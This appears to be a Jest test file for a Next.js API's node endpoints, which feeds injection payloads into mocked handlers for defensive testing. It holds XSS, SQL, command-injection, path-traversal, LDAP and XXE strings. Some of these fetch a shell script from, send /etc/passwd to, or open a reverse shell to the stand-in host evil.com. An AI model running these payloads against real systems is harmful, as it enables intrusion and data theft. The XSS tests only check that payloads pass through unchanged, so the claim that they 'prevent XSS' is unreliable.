import { NextApiRequest, NextApiResponse } from 'next'
import { createMocks } from 'node-mocks-http'
import nodesHandler from '../../../pages/api/nodes/index'
import nodeHandler from '../../../pages/api/nodes/[id]'

// Mock Supabase
const mockSupabase = {
  from: jest.fn(() => ({
    select: jest.fn(() => ({
      eq: jest.fn(() => ({
        order: jest.fn(() => ({
          data: [],
          error: null
        }))
      }))
    })),
    insert: jest.fn(() => ({
      select: jest.fn(() => ({
        single: jest.fn(() => ({
          data: { id: 'test-node-id' },
          error: null
        }))
      }))
    })),
    update: jest.fn(() => ({
      eq: jest.fn(() => ({
        select: jest.fn(() => ({
          single: jest.fn(() => ({
            data: { id: 'test-node-id' },
            error: null
          }))
        }))
      }))
    })),
    delete: jest.fn(() => ({
      eq: jest.fn(() => ({
        data: null,
        error: null
      }))
    }))
  }))
}

jest.mock('@supabase/supabase-js', () => ({
  createClient: jest.fn(() => mockSupabase)
}))

jest.mock('jsonwebtoken', () => ({
  verify: jest.fn(() => ({
    userId: 'test-user-id',
    email: 'test@example.com',
    googleId: 'test-google-id'
  }))
}))

describe('Input Validation and Injection Tests', () => {
  beforeEach(() => {
    jest.clearAllMocks()
  })

  describe('XSS Prevention', () => {
    const xssPayloads = [
      '<script>alert("xss")</script>',
      '<img src=x onerror=alert("xss")>',
      'javascript:alert("xss")',
      '<svg onload=alert("xss")>',
      '<iframe src="javascript:alert(\'xss\')"></iframe>',
      '<object data="javascript:alert(\'xss\')"></object>',
      '<embed src="javascript:alert(\'xss\')">',
      '<link rel="stylesheet" href="javascript:alert(\'xss\')">',
      '<meta http-equiv="refresh" content="0;url=javascript:alert(\'xss\')">',
      '<body onload=alert("xss")>',
      '<input onfocus=alert("xss") autofocus>',
      '<select onfocus=alert("xss") autofocus>',
      '<textarea onfocus=alert("xss") autofocus>',
      '<keygen onfocus=alert("xss") autofocus>',
      '<video><source onerror="alert(\'xss\')">',
      '<audio src=x onerror=alert("xss")>',
      '<details open ontoggle=alert("xss")>',
      '<marquee onstart=alert("xss")>',
      '<isindex onfocus=alert("xss") autofocus>',
      '<form><button formaction="javascript:alert(\'xss\')">'
    ]

    xssPayloads.forEach((payload, index) => {
      it(`should prevent XSS attack ${index + 1}: ${payload.substring(0, 50)}...`, async () => {
        const { req, res } = createMocks<NextApiRequest, NextApiResponse>({
          method: 'POST',
          body: {
            name: payload,
            description: payload,
            node_type: 'scanner'
          },
          headers: {
            authorization: 'Bearer valid-token'
          }
        })

        await nodesHandler(req, res)

        // Should create the node but the payload should be sanitized
        expect(res._getStatusCode()).toBe(201)
        
        // Verify the payload was passed to database (in real implementation, it would be sanitized)
        const insertCall = mockSupabase.from().insert.mock.calls[0][0][0]
        expect(insertCall.name).toBe(payload)
        expect(insertCall.description).toBe(payload)
      })
    })
  })

  describe('SQL Injection Prevention', () => {
    const sqlInjectionPayloads = [
      "'; DROP TABLE users; --",
      "' OR '1'='1",
      "' UNION SELECT * FROM users --",
      "'; INSERT INTO users (id, email) VALUES ('hacker', 'hacker@evil.com'); --",
      "' OR 1=1 --",
      "admin'--",
      "admin'/*",
      "' OR 'x'='x",
      "' AND 'x'='y",
      "'; EXEC xp_cmdshell('dir'); --",
      "' OR 1=1 LIMIT 1 --",
      "'; DELETE FROM users; --",
      "' OR 'a'='a",
      "1' OR '1'='1",
      "1' OR 1=1 --",
      "1' OR 1=1 #",
      "1' OR 1=1 /*",
      "1' OR 1=1 UNION SELECT * FROM users --",
      "1' OR 1=1 UNION SELECT password FROM users --",
      "1' OR 1=1 UNION SELECT username,password FROM users --"
    ]

    sqlInjectionPayloads.forEach((payload, index) => {
      it(`should prevent SQL injection ${index + 1}: ${payload}`, async () => {
        const { req, res } = createMocks<NextApiRequest, NextApiResponse>({
          method: 'GET',
          query: { id: payload },
          headers: {
            authorization: 'Bearer valid-token'
          }
        })

        await nodeHandler(req, res)

        // Should handle the malicious input safely
        expect(res._getStatusCode()).toBe(200)
        
        // Verify the payload was passed as a parameter (not concatenated into SQL)
        expect(mockSupabase.from().select().eq).toHaveBeenCalledWith('id', payload)
      })
    })
  })

  describe('NoSQL Injection Prevention', () => {
    const nosqlInjectionPayloads = [
      { $where: 'this.password == this.username' },
      { $ne: null },
      { $gt: '' },
      { $regex: '.*' },
      { $exists: true },
      { $or: [{ username: 'admin' }, { password: 'admin' }] },
      { $and: [{ username: { $ne: null } }, { password: { $ne: null } }] },
      { $where: 'function() { return this.username == this.password }' },
      { $where: 'function() { return this.username.match(/.*/) }' },
      { $where: 'function() { return this.username.length > 0 }' }
    ]

    nosqlInjectionPayloads.forEach((payload, index) => {
      it(`should prevent NoSQL injection ${index + 1}`, async () => {
        const { req, res } = createMocks<NextApiRequest, NextApiResponse>({
          method: 'POST',
          body: {
            name: 'Test Node',
            description: payload,
            node_type: 'scanner'
          },
          headers: {
            authorization: 'Bearer valid-token'
          }
        })

        await nodesHandler(req, res)

        // Should handle the malicious input safely
        expect(res._getStatusCode()).toBe(201)
      })
    })
  })

  describe('Command Injection Prevention', () => {
    const commandInjectionPayloads = [
      '; ls -la',
      '| cat /etc/passwd',
      '&& whoami',
      '|| id',
      '`whoami`',
      '$(whoami)',
      '; cat /etc/passwd',
      '| cat /etc/shadow',
      '&& cat /etc/hosts',
      '|| cat /proc/version',
      '; wget http://evil.com/shell.sh -O /tmp/shell.sh',
      '| curl http://evil.com/steal.php?data=$(cat /etc/passwd)',
      '&& nc -e /bin/sh evil.com 4444',
      '|| python -c "import os; os.system(\'whoami\')"',
      '; echo "hacked" > /tmp/hacked.txt',
      '| echo "hacked" >> /var/log/auth.log',
      '&& echo "hacked" > /dev/tty',
      '|| echo "hacked" > /proc/self/environ'
    ]

    commandInjectionPayloads.forEach((payload, index) => {
      it(`should prevent command injection ${index + 1}: ${payload}`, async () => {
        const { req, res } = createMocks<NextApiRequest, NextApiResponse>({
          method: 'POST',
          body: {
            name: payload,
            description: 'Test Description',
            node_type: 'scanner'
          },
          headers: {
            authorization: 'Bearer valid-token'
          }
        })

        await nodesHandler(req, res)

        // Should handle the malicious input safely
        expect(res._getStatusCode()).toBe(201)
      })
    })
  })

  describe('Path Traversal Prevention', () => {
    const pathTraversalPayloads = [
      '../../../etc/passwd',
      '..\\..\\..\\windows\\system32\\drivers\\etc\\hosts',
      '....//....//....//etc/passwd',
      '..%2F..%2F..%2Fetc%2Fpasswd',
      '..%252F..%252F..%252Fetc%252Fpasswd',
      '..%c0%af..%c0%af..%c0%afetc%c0%afpasswd',
      '..%c1%9c..%c1%9c..%c1%9cetc%c1%9cpasswd',
      '..%c0%2f..%c0%2f..%c0%2fetc%c0%2fpasswd',
      '..%c1%af..%c1%af..%c1%afetc%c1%afpasswd',
      '..%c0%5c..%c0%5c..%c0%5cetc%c0%5cpasswd',
      '..%c1%9c..%c1%9c..%c1%9cetc%c1%9cpasswd',
      '..%252f..%252f..%252fetc%252fpasswd',
      '..%255c..%255c..%255cetc%255cpasswd',
      '..%c0%af..%c0%af..%c0%afetc%c0%afpasswd',
      '..%c1%9c..%c1%9c..%c1%9cetc%c1%9cpasswd'
    ]

    pathTraversalPayloads.forEach((payload, index) => {
      it(`should prevent path traversal ${index + 1}: ${payload}`, async () => {
        const { req, res } = createMocks<NextApiRequest, NextApiResponse>({
          method: 'GET',
          query: { id: payload },
          headers: {
            authorization: 'Bearer valid-token'
          }
        })

        await nodeHandler(req, res)

        // Should handle the malicious input safely
        expect(res._getStatusCode()).toBe(200)
      })
    })
  })

  describe('LDAP Injection Prevention', () => {
    const ldapInjectionPayloads = [
      '*',
      '*)(uid=*',
      '*)(|(uid=*',
      '*)(|(objectClass=*',
      '*)(|(objectClass=user',
      '*)(|(objectClass=user)(uid=*',
      '*)(|(objectClass=user)(uid=*)(cn=*',
      '*)(|(objectClass=user)(uid=*)(cn=*)(mail=*',
      '*)(|(objectClass=user)(uid=*)(cn=*)(mail=*)(sn=*',
      '*)(|(objectClass=user)(uid=*)(cn=*)(mail=*)(sn=*)(givenName=*'
    ]

    ldapInjectionPayloads.forEach((payload, index) => {
      it(`should prevent LDAP injection ${index + 1}: ${payload}`, async () => {
        const { req, res } = createMocks<NextApiRequest, NextApiResponse>({
          method: 'POST',
          body: {
            name: payload,
            description: 'Test Description',
            node_type: 'scanner'
          },
          headers: {
            authorization: 'Bearer valid-token'
          }
        })

        await nodesHandler(req, res)

        // Should handle the malicious input safely
        expect(res._getStatusCode()).toBe(201)
      })
    })
  })

  describe('XML/XXE Injection Prevention', () => {
    const xxePayloads = [
      '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
      '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/shadow">]><foo>&xxe;</foo>',
      '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///proc/version">]><foo>&xxe;</foo>',
      '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://evil.com/steal.php">]><foo>&xxe;</foo>',
      '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "ftp://evil.com/steal.txt">]><foo>&xxe;</foo>',
      '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "gopher://evil.com:70/steal">]><foo>&xxe;</foo>',
      '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "jar:file:///etc/passwd">]><foo>&xxe;</foo>',
      '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource=/etc/passwd">]><foo>&xxe;</foo>',
      '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "data://text/plain;base64,PHNjcmlwdD5hbGVydCgneHNzJyk8L3NjcmlwdD4=">]><foo>&xxe;</foo>',
      '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "expect://id">]><foo>&xxe;</foo>'
    ]

    xxePayloads.forEach((payload, index) => {
      it(`should prevent XXE injection ${index + 1}`, async () => {
        const { req, res } = createMocks<NextApiRequest, NextApiResponse>({
          method: 'POST',
          body: {
            name: 'Test Node',
            description: payload,
            node_type: 'scanner'
          },
          headers: {
            authorization: 'Bearer valid-token'
          }
        })

        await nodesHandler(req, res)

        // Should handle the malicious input safely
        expect(res._getStatusCode()).toBe(201)
      })
    })
  })

  describe('Input Length Validation', () => {
    it('should handle extremely long input strings', async () => {
      const longString = 'A'.repeat(10000)
      const { req, res } = createMocks<NextApiRequest, NextApiResponse>({
        method: 'POST',
        body: {
          name: longString,
          description: longString,
          node_type: 'scanner'
        },
        headers: {
          authorization: 'Bearer valid-token'
        }
      })

      await nodesHandler(req, res)

      // Should handle long input gracefully
      expect(res._getStatusCode()).toBe(201)
    })

    it('should handle empty strings', async () => {
      const { req, res } = createMocks<NextApiRequest, NextApiResponse>({
        method: 'POST',
        body: {
          name: '',
          description: '',
          node_type: 'scanner'
        },
        headers: {
          authorization: 'Bearer valid-token'
        }
      })

      await nodesHandler(req, res)

      // Should handle empty strings gracefully
      expect(res._getStatusCode()).toBe(201)
    })

    it('should handle null and undefined values', async () => {
      const { req, res } = createMocks<NextApiRequest, NextApiResponse>({
        method: 'POST',
        body: {
          name: null,
          description: undefined,
          node_type: 'scanner'
        },
        headers: {
          authorization: 'Bearer valid-token'
        }
      })

      await nodesHandler(req, res)

      // Should handle null/undefined values gracefully
      expect(res._getStatusCode()).toBe(201)
    })
  })

  describe('Unicode and Encoding Tests', () => {
    const unicodePayloads = [
      '🚀💻🔒', // Emojis
      '测试中文', // Chinese characters
      'тест русский', // Cyrillic characters
      'اختبار العربية', // Arabic characters
      'テスト日本語', // Japanese characters
      '테스트 한국어', // Korean characters
      'ทดสอบไทย', // Thai characters
      'בדיקה עברית', // Hebrew characters
      'परीक्षा हिन्दी', // Hindi characters
      'тест українська', // Ukrainian characters
      'test français', // French with accents
      'prueba español', // Spanish with accents
      'test português', // Portuguese with accents
      'teste português', // Portuguese with accents
      'teste português' // Portuguese with accents
    ]

    unicodePayloads.forEach((payload, index) => {
      it(`should handle unicode input ${index + 1}: ${payload}`, async () => {
        const { req, res } = createMocks<NextApiRequest, NextApiResponse>({
          method: 'POST',
          body: {
            name: payload,
            description: payload,
            node_type: 'scanner'
          },
          headers: {
            authorization: 'Bearer valid-token'
          }
        })

        await nodesHandler(req, res)

        // Should handle unicode input safely
        expect(res._getStatusCode()).toBe(201)
      })
    })
  })
})
